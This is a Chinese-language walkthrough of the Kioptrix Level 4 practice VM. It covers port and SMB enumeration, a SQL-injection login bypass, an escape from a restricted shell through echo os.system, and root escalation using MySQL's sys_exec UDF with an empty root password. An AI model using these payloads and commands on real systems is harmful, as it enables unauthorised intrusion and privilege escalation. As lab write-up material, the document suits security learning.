### 端口扫描

```bash
# Nmap 7.94SVN scan initiated Tue Nov  5 10:24:55 2024 as: nmap -sT --min-rate 10000 -p- -oN nmapscan/port_scan 192.168.217.142
Nmap scan report for 192.168.217.142
Host is up (0.00093s latency).
Not shown: 39528 closed tcp ports (conn-refused), 26003 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:5D:77:E0 (VMware)
```

```bash
# Nmap 7.94SVN scan initiated Tue Nov  5 10:25:31 2024 as: nmap -sT -sV -sC -O -p22,80,139,445 -v -oN nmapscan/detail_scan 192.168.217.142
Nmap scan report for 192.168.217.142
Host is up (0.0013s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:5D:77:E0 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 497.101 days (since Tue Jun 27 09:00:18 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=200 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2024-11-05T18:25:44-05:00
|_clock-skew: mean: 10h29m59s, deviation: 3h32m07s, median: 7h59m59s
| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX4<00>        Flags: <unique><active>
|   KIOPTRIX4<03>        Flags: <unique><active>
|   KIOPTRIX4<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|_  WORKGROUP<00>        Flags: <group><active>
```

### 扫描smb漏洞

```bash
nmap -p 139 --script=*smb* -oN nmapscan/smb_scan 192.168.217.142
```

```
|_smb-mbenum: ERROR: Script execution failed (use -d to debug)
| smb-enum-users: 
|   KIOPTRIX4\john (RID: 3002)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\loneferret (RID: 3000)
|     Full name:   loneferret,,,
|     Flags:       Normal user account
|   KIOPTRIX4\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account
|   KIOPTRIX4\robert (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\root (RID: 1000)
|     Full name:   root
|_    Flags:       Normal user account
```

可以找到几个用户：`john、loneferret、robert、root`

利用`enum4linux`,同样可以得到

```
enum4linux -U 192.168.217.142
```

![image-20241107114520150](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241107114520150.png)

### web端渗透

![image-20241107114637421](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241107114637421.png)

Password处有万能密码

`' or 1=1--+'`

登录john，robert用户

![image-20241107115243130](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241107115243130.png)

![image-20241107115506386](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241107115506386.png)

拿到密码

### SSH登录

现在又两对凭据，尝试进行SSH登录

```bash
ssh robert@192.168.217.142
```

![image-20241107115731217](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241107115731217.png)

`LigGoat Shell `是一个受限的shell环境，只可以执行几个命令

如何绕过 `LigGoat Shell` 的限制？

> 利用`echo`命令执行系统命令：在某些受限的shell环境中，`echo`命令可能被允许执行。可以通过`echo`命令配合其他技巧来执行系统命令，例如`echo os.system('/bin/bash')`
>
> https://www.aldeid.com/wiki/Lshell

拿到一个完整的shell，接着就是提权

### 提权

```bash
robert@Kioptrix4:~$ uname -a
Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
robert@Kioptrix4:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"
```

这里我没有找到可以提权的方案

### UDF提权

去看web目录下收集信息

```bash
robert@Kioptrix4:/var/www$ cat checklogin.php 
<?php
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
```

这里root用户的密码为空

```bash
robert@Kioptrix4:/var/www$ mysql -uroot
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 49
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> select user();
+----------------+
| user()         |
+----------------+
| root@localhost | 
+----------------+
1 row in set (0.00 sec)
```

查看用户定义函数（UDF）信息

```mysql
mysql> select * from mysql.func;
+-----------------------+-----+---------------------+----------+
| name                  | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function | 
| sys_exec              |   0 | lib_mysqludf_sys.so | function | 
+-----------------------+-----+---------------------+----------+
2 rows in set (0.00 sec)
```

添加进`admin`组

```
usermod -a -G admin john
```

移除：`usermod -G "" john`

```mysql
mysql> select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.04 sec)
```

```bash
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
john@Kioptrix4:~$ sudo -l
[sudo] password for john: 
User john may run the following commands on this host:
    (ALL) ALL
john@Kioptrix4:~$ sudo bash
root@Kioptrix4:~# id
uid=0(root) gid=0(root) groups=0(root)
```

成功拿到root

> [MySQL提权之UDF提权](https://blog.csdn.net/2301_76227305/article/details/139545193)
>
> [Kioptrix Level 1.3 (#4) Walkthrough](https://www.doyler.net/security-not-included/kioptrix-level-1-3-4-walkthrough)